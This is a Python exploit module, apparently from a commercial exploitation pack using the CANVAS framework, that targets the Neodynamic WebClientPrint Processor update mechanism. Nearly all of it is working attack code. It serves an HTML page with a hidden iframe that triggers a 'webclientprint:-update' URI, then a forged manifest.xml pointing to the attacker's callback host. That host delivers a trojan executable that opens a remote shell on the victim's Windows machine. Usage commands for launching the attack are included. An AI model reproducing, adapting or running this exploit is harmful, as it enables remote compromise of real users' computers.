#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2018
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.canvasos import *
from MOSDEF import pelib 

import urllib
import struct

# GUI info
NAME = "WebClientPrint Processor Updates Remote Code Execution Vulnerability"

DESCRIPTION = "Remote code execution vulnerability in WebClientPrint Processor manifest.xml update mechanism file handling"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Neodynamic"
DOCUMENTATION["Date public"] = "2017.08.22"
DOCUMENTATION["VersionsAffected"] = "WebClientPrint < 2.0.15.910"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "https://packetstormsecurity.com/files/143892/WebClientPrint-Processor-2.0.15.109-Updates-Remote-Code-Execution.html"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_webclientprint2 -l 192.168.1.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0 : ["All"], 
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1        
        self.badstring = ""
        self.name = NAME 
        self.filename = "index.html"
        self.webclientprintfile = "manifest.xml"
        self.trojannamew = "wcpp.exe"        
        self.htafile = ""
        
        return
    
	
    def makefile(self):
        filedata = """<html>
<head>    
<meta http-equiv="refresh" content="8"/>
</head>        
<body>
<iframe src="webclientprint:-update:MOSDEFTROJANURL"></iframe>
</body>
</html>    
"""
        if self.useSSL:
            filedata = filedata.replace("MOSDEFTROJANURL", "https://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.webclientprintfile)
        else:
            filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.webclientprintfile)
        
      	if self.useSSL:
      		filedata = filedata.replace('http:', 'https:')
              		
        return filedata
        
    def maketrojan(self):
        t_os = canvasos("Windows")
        t_os.arch = "X86"
    
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os, http=True, ssl=self.useSSL)        
        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamew))          		
        self.setInfo("%s - done"%(NAME))
        ret = len(self.mosdeftrojan) != 0	
		
        return ret

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()	              	
	        
        if clientheader.URL.count(self.filename):
            self.log("Sending HTML file: %s" % (self.filename))                                  
            sploitstring = self.makefile()    
            b.setBody(sploitstring)                
        elif clientheader.URL.count(self.webclientprintfile):
            self.log("Sending XML file: %s" % (self.webclientprintfile))        
            sploitstring = """<?xml version="1.0" encoding="UTF-8"?>
<manifest>
  <AvailableVersion>5.0.0</AvailableVersion>
  <AppUrl>MOSDEFTROJANURL</AppUrl>
</manifest>"""
            if self.useSSL:
                sploitstring = sploitstring.replace("MOSDEFTROJANURL", "https://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojannamew)
            else:
                sploitstring = sploitstring.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojannamew)
            if self.useSSL:
                sploitstring = sploitstring.replace('http:', 'https:')                                                                        
            b.setBody(sploitstring)                                  	        	        
        elif clientheader.URL.count(self.trojannamew):
            self.log("Sending EXE file: %s" % (self.trojannamew))                                  
            self.maketrojan()
            sploitstring = self.mosdeftrojan
            h.addHeader('Content-Type', 'binary/octet-stream')
            b.setBody(sploitstring)                
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
            
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
                           
    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
